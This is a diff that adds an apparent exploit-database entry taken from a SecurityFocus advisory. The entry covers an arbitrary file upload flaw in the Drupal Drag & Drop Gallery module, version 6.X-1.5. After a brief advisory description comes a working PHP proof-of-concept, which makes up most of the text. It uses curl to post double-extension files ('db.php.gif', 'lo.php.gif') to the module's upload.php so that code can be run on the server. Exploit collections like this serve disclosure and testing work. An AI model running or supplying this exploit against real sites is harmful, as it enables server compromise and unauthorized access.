@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/54179/info
+
+Drag & Drop Gallery is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.
+
+An attacker can exploit this vulnerability to upload arbitrary code and execute it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.
+
+Drag & Drop Gallery 6.X-1.5 is vulnerable; other versions may also be affected. 
+
+<?php
+
+$uploadfile="db.php.gif";
+$uploadfile2="lo.php.gif";
+
+$ch = curl_init("http://www.example.com/drupal/sites/all/modules/dragdrop_gallery/upload.php?nid=1&filedir=/drupal/sites/all/modules/dragdrop_gallery/");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('user_file[0]'=>"@$uploadfile",
+                                            'user_file[1]'=>"@$uploadfile2"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+   
+print "$postResult";
+
+?>
